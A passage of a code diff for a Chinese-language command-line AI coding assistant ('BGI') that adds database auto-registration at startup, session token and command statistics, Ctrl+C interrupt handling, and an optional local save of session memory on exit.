   console.log(source_default.bold.cyan("\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"));
   console.log(`  ${source_default.bold("\u670D\u52A1\u5546:")}  ${prov?.name ?? cfg.provider}`);
   console.log(`  ${source_default.bold("\u6A21\u578B:")}    ${source_default.green(cfg.model)}`);
-  console.log(`  ${source_default.bold("Skills:")}  ${totalSkills > 0 ? source_default.green(`${totalSkills} \u4E2A`) : source_default.yellow("\u672A\u5B89\u88C5")}  ${source_default.dim("(/sk \u641C\u7D22  /cat \u5206\u7C7B\u76EE\u5F55)")}`);
+  console.log(`  ${source_default.bold("Skills:")}  ${skillsLabel}  ${source_default.dim("(/sk \u641C\u7D22  /cat \u5206\u7C7B\u76EE\u5F55)")}`);
   console.log(`  ${source_default.bold("\u5DE5\u5177:")}    bash \xB7 read_file \xB7 write_file \xB7 list_dir \xB7 search_files`);
   console.log(`  ${source_default.bold("\u65B0\u529F\u80FD:")}  /sessions /resume /checkpoint /run /check-env /install /diff`);
   console.log(source_default.bold.cyan("\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"));
@@ -16727,7 +17685,22 @@ async function main() {
   }
   console.log(source_default.dim("  \u8F93\u5165\u95EE\u9898\u5F00\u59CB\u5BF9\u8BDD   /help \u67E5\u770B\u547D\u4EE4   /cat \u6280\u80FD\u5206\u7C7B   @\u6587\u4EF6\u8DEF\u5F84 \u5185\u5D4C\u6587\u4EF6"));
   console.log();
-  const systemPrompt = buildSystemPrompt();
+  dbRegistry = loadDbRegistry();
+  if (Object.keys(dbRegistry.databases).length === 0) {
+    process.stdout.write(source_default.dim("  \u6B63\u5728\u81EA\u52A8\u626B\u63CF\u53C2\u8003\u6570\u636E\u5E93...\n"));
+    const report = scanForDatabases([]);
+    if (report.found.length > 0) {
+      for (const entry of report.found) dbRegistry.databases[entry.id] = entry;
+      dbRegistry.lastScan = (/* @__PURE__ */ new Date()).toISOString();
+      saveDbRegistry(dbRegistry);
+      process.stdout.write(source_default.green(`  \u2713 \u53D1\u73B0 ${report.found.length} \u4E2A\u6570\u636E\u5E93\uFF0C\u5DF2\u81EA\u52A8\u6CE8\u518C (/db list \u67E5\u770B)
+`));
+    } else {
+      process.stdout.write(source_default.dim("  \u672A\u53D1\u73B0\u5DF2\u77E5\u6570\u636E\u5E93\uFF08\u53EF\u7528 /db add <\u8DEF\u5F84> \u624B\u52A8\u6DFB\u52A0\uFF09\n"));
+    }
+    console.log();
+  }
+  systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
   let history = [];
   let thinkMode = false;
   const injectedSkills = /* @__PURE__ */ new Map();
@@ -16746,6 +17719,113 @@ async function main() {
   }
   let lastCheckpointMsgCount = 0;
   const CHECKPOINT_INTERVAL = 6;
+  const sessionStartTime = Date.now();
+  const sessionStats = { inputTokens: 0, outputTokens: 0, successCmds: 0, failCmds: 0 };
+  let lastSigintTime = 0;
+  let currentAbortController = null;
+  let exiting = false;
+  function formatDuration(ms) {
+    const s2 = Math.floor(ms / 1e3);
+    const h2 = Math.floor(s2 / 3600);
+    const m2 = Math.floor(s2 % 3600 / 60);
+    const sec = s2 % 60;
+    if (h2 > 0) return `${h2}h ${m2}m ${sec}s`;
+    if (m2 > 0) return `${m2}m ${sec}s`;
+    return `${sec}s`;
+  }
+  function saveSessionMemory() {
+    const memDir = (0, import_path6.join)(BGI_DIR, "memory");
+    if (!(0, import_fs6.existsSync)(memDir)) (0, import_fs6.mkdirSync)(memDir, { recursive: true });
+    const dateStr = new Date(sessionStartTime).toISOString().slice(0, 10);
+    const filename = (0, import_path6.join)(memDir, `${dateStr}-${sessionId}.md`);
+    const lines = [
+      `# \u4F1A\u8BDD\u8BB0\u5FC6 ${new Date(sessionStartTime).toLocaleString("zh-CN")}`,
+      ``,
+      `- \u6A21\u578B: ${loadConfig().model}`,
+      `- Token: \u8F93\u5165 ${sessionStats.inputTokens} / \u8F93\u51FA ${sessionStats.outputTokens}`,
+      `- \u547D\u4EE4: ${sessionStats.successCmds} \u6210\u529F / ${sessionStats.failCmds} \u5931\u8D25`,
+      ``
+    ];
+    let turnCount = 0;
+    for (let i2 = 0; i2 < history.length; i2++) {
+      const msg = history[i2];
+      if (msg.role === "user" && typeof msg.content === "string") {
+        turnCount++;
+        const content = msg.content.slice(0, 500) + (msg.content.length > 500 ? "..." : "");
+        lines.push(`## \u5BF9\u8BDD ${turnCount}`);
+        lines.push(`**\u7528\u6237**: ${content}`);
+      } else if (msg.role === "assistant" && typeof msg.content === "string") {
+        const content = msg.content.slice(0, 500) + (msg.content.length > 500 ? "..." : "");
+        lines.push(`**BGI**: ${content}`);
+        lines.push(``);
+      }
+    }
+    (0, import_fs6.writeFileSync)(filename, lines.join("\n"), "utf8");
+    console.log(source_default.green(`  \u2713 \u8BB0\u5FC6\u5DF2\u4FDD\u5B58: ${filename}`));
+  }
+  async function exitWithReport() {
+    if (exiting) return;
+    exiting = true;
+    rl.removeAllListeners("SIGINT");
+    process.removeAllListeners("SIGINT");
+    const runtime = formatDuration(Date.now() - sessionStartTime);
+    console.log("\n" + source_default.bold.cyan("\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 \u4F1A\u8BDD\u62A5\u544A \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550"));
+    console.log(`  \u8FD0\u884C\u65F6\u95F4:   ${source_default.white(runtime)}`);
+    console.log(`  \u6D88\u8017 Token: ${source_default.yellow("\u8F93\u5165")} ${source_default.bold(String(sessionStats.inputTokens))}  |  ${source_default.green("\u8F93\u51FA")} ${source_default.bold(String(sessionStats.outputTokens))}`);
+    console.log(`  \u6267\u884C\u547D\u4EE4:   ${source_default.green("\u2713 " + sessionStats.successCmds + " \u6210\u529F")}  ${sessionStats.failCmds > 0 ? source_default.yellow("\u2717 " + sessionStats.failCmds + " \u5931\u8D25") : source_default.dim("\u2717 0 \u5931\u8D25")}`);
+    console.log(source_default.bold.cyan("\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550"));
+    rl.close();
+    let ans = "n";
+    try {
+      const exitRl = (0, import_readline.createInterface)({ input: process.stdin, output: process.stdout });
+      exitRl.on("SIGINT", () => {
+        exitRl.close();
+        process.exit(0);
+      });
+      process.once("SIGINT", () => {
+        exitRl.close();
+        process.exit(0);
+      });
+      ans = await Promise.race([
+        new Promise((res) => {
+          exitRl.question(source_default.cyan("\n  \u662F\u5426\u4FDD\u5B58\u672C\u6B21\u4F1A\u8BDD\u8BB0\u5FC6\uFF1F[y/N] "), (a2) => {
+            exitRl.close();
+            res(a2.trim().toLowerCase());
+          });
+        }),
+        new Promise((res) => setTimeout(() => {
+          exitRl.close();
+          res("n");
+        }, 15e3))
+      ]);
+    } catch {
+    }
+    if (ans === "y") saveSessionMemory();
+    console.log(source_default.dim("\n\u518D\u89C1\uFF01"));
+    process.exit(0);
+  }
+  let lastSigintCall = 0;
+  function handleSigint() {
+    const now = Date.now();
+    if (now - lastSigintCall < 200) return;
+    lastSigintCall = now;
+    if (now - lastSigintTime < 2e3) {
+      sigintHandling = false;
+      exitWithReport().catch(() => process.exit(0));
+    } else {
+      lastSigintTime = now;
+      sigintHandling = true;
+      if (currentAbortController) {
+        currentAbortController.abort();
+      }
+      process.stdout.write(source_default.yellow("\n\n  [\u4EFB\u52A1\u5DF2\u4E2D\u65AD] \u518D\u6309\u4E00\u6B21 Ctrl+C \u9000\u51FA\n\n"));
+      setTimeout(() => {
+        sigintHandling = false;
+      }, 500);
+    }
+  }
+  rl.on("SIGINT", handleSigint);
+  process.on("SIGINT", handleSigint);
   while (true) {
     let input;
     const thinkIndicator = thinkMode ? source_default.yellow("[\u601D\u8003]") + " " : "";
@@ -16754,12 +17834,12 @@ async function main() {
     } catch {
       break;
     }
+    if (exiting) break;
     const trimmed = input.trim();
     if (!trimmed) continue;
     if (["exit", "quit", "q", "/exit", "/quit"].includes(trimmed.toLowerCase())) {
-      console.log(source_default.dim("\u518D\u89C1\uFF01"));
-      rl.close();
-      break;
+      await exitWithReport();
+      return;
     }
     if (trimmed.startsWith("/")) {
       const result = await handleCommand(trimmed, rl, history, thinkMode, injectedSkills);
@@ -16815,7 +17895,14 @@ ${expanded}` : expanded;
     history.push({ role: "user", content: userContent });
     try {
       const currentCfg = loadConfig();
-      const reply = await chat(history, currentCfg, systemPrompt);
+      currentAbortController = new AbortController();
+      const reply = await chat(history, currentCfg, systemPrompt, sessionStats, currentAbortController.signal);
+      currentAbortController = null;
+      if (!reply && history[history.length - 1]?.role === "user") {
+        history.pop();
+        console.log();
+        continue;
+      }
       history.push({ role: "assistant", content: reply });
       history = await maybeCompact(history, currentCfg);
       autoSaveSession();
@@ -16830,7 +17917,13 @@ ${expanded}` : expanded;
   [\u6FC0\u6D3B Skill: ${ids}]`));
       }
     } catch (err) {
+      currentAbortController = null;
       const msg = err instanceof Error ? err.message : String(err);
+      if (err instanceof Error && (err.name === "AbortError" || msg.toLowerCase().includes("abort"))) {
+        history.pop();
+        console.log();
+        continue;
+      }
       console.error(source_default.red(`
 \u9519\u8BEF: ${msg}
 `));
@@ -16838,10 +17931,11 @@ ${expanded}` : expanded;
     }
     console.log();
   }
+  await exitWithReport();
 }
 function question(rl, prompt) {
-  return new Promise((resolve3, reject) => {
-    rl.question(prompt, resolve3);
+  return new Promise((resolve4, reject) => {
+    rl.question(prompt, resolve4);
     rl.once("close", () => reject(new Error("closed")));
   });
 }
